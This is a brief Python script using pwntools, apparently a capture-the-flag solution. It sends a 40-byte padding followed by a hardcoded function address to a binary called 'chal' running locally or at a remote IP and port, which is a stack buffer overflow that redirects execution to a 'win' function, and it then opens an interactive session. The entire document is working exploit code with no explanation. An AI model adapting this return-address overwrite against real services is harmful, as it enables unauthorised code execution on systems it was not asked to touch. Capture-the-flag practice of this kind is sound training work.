from pwn import *

context.binary = elf = ELF('./chal')
context.log_level = 'info'

def start():
    if args.REMOTE:
        return remote('10.21.232.223', 55994)
    return process('./chal')

p = start()

win = 0x4011f6

payload  = b'A' * 40
payload += p64(win)

p.recvuntil(b'Helo who ar yo?')
p.sendline(payload)

p.interactive()
